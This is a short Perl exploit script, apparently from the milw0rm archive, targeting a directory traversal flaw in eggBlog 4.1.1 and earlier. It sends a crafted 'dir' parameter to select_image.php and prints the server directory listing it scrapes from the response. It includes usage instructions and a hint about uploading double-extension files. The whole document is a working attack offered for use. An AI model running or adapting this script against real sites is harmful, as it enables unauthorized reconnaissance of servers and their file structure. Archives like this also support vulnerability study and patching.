#!/usr/bin/perl 
#
# eggBlog <= 4.1.1 Local Directory Transversal Exploit
# 
# by Juri Gianni aka yeat - staker[at]hotmail[dot]it
# Visit http://zeroidentity.org
#
# Description
# ----------------------------------------------------
# eggBlog contains one flaw that allows an attacker to
# carry out a local directory transversal attack. 
# The issue is due to 'select_image.php' script not 
# properly sanitizing user input supplied to the 'dir'
# GET variable.
# -----------------------------------------------------
# Note: you may upload image files with double ext on
# _lib/openwysiwyg/addons/imagelibrary/insert_image.php
# -----------------------------------------------------

use LWP::UserAgent;


my $domain = $ARGV[0];
my $folder = $ARGV[1] || &usage;

exploit($folder);


sub usage()
{
      print "eggBlog <= 4.1.1 Local Directory Transversal Exploit\n";
      print "Usage: perl xpl.pl localhost/eggBlog ../../\n";
      print "Visit http://zeroidentity.org\n";
      exit;
}      


sub exploit()
{
      my $param = shift @_ || die "1 parameter required\n"; 
       
      my $response = undef;
      my @director = undef;
      
      my $lib = new LWP::UserAgent;
      
      $lib->agent('Lynx (textmode)');
      $lib->timeout(5);
      
      $response = $lib->get("http://$domain/_lib/openwysiwyg/addons/imagelibrary/select_image.php?dir=$param");
      
      @director = $response->content =~ /<strong>(.+?)<\/strong>/ig;
      
      for (my $i=0;$i<=scalar(@director);$i++) {
         print $director[$i]."\n";
      }   
}      

# milw0rm.com [2009-05-11]
